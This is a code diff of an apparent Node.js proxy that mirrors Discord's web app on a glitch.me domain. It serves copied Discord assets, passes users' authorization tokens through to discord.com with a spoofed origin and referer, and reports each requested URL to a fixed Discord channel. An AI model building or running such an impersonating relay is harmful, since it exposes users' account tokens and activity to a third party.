@@ -35,6 +35,9 @@ return;
 }
     client.createMessage('929480482700288032', `https://discord.com${req.originalUrl}`)
 console.log(req.originalUrl)
+  
+  req.originalUrl = req.originalUrl.replace('%40', '@')
+  
   if(req.originalUrl === '/assets/0.2d737cc92c807c265e1f.css') return res.sendFile(__dirname + "/style1.css")
   if(req.originalUrl === '/assets/532.d49196785d17cb9b60a9.css') return res.sendFile(__dirname + "/style2.css")
   if(req.originalUrl === '/app') return res.sendFile(__dirname + "/app.html")
@@ -44,18 +47,21 @@ console.log(req.originalUrl)
 
   let headers = req.headers
   var headersNew = {}
-if(headers['x-super-properties']) headersNew['x-super-properties'] = headers['x-super-properties']
+//if(headers['x-super-properties']) headersNew['x-super-properties'] = headers['x-super-properties']
   if(headers['user-agent']) headersNew['user-agent'] = headers['user-agent']
-if(headers['x-discord-locale']) headersNew['x-discord-locale'] = headers['x-discord-locale']
+//if(headers['x-discord-locale']) headersNew['x-discord-locale'] = headers['x-discord-locale']
 if(headers['authorization']) headersNew['authorization'] = headers['authorization']
-if(headers['cookie']) headersNew['cookie'] = headers['cookie']
-if(headers['x-fingerprint']) headersNew['x-fingerprint'] = headers['x-fingerprint']
+//if(headers['cookie']) headersNew['cookie'] = headers['cookie']
+//if(headers['x-fingerprint']) headersNew['x-fingerprint'] = headers['x-fingerprint']
 if(headers['content-type']) headersNew['content-type'] = headers['content-type']
 //          console.log('https://discord.com' + req.originalUrl)
 
-// if(headersNew.authorization) headersNew.authorization = "Bot " + headersNew.authorization
+//if(headersNew.authorization) headersNew.authorization = "Bot " + headersNew.authorization
  if(headersNew.referer) headersNew.referer = `${headersNew.referer}`.replace('https://scalloped-mahogany-chronometer.glitch.me/', 'https://discord.com/')
  if(headersNew.origin) headersNew.origin = `https://discord.com/`
+ 
+// console.log(headersNew)
+ 
   if(JSON.stringify(req.body) !== `{}`){
   let dataFetch = await fetch(('https://discord.com' + `${req.originalUrl}`.replace('v9', 'v7')), {method: req.method, headers: headersNew, body: JSON.stringify(req.body)}).catch(err =>{})
   if(!dataFetch) dataFetch = await fetch(('https://discord.com' + `${req.originalUrl}`.replace('v9', 'v7')), {method: req.method, body: JSON.stringify(req.body)}).catch(err =>{})
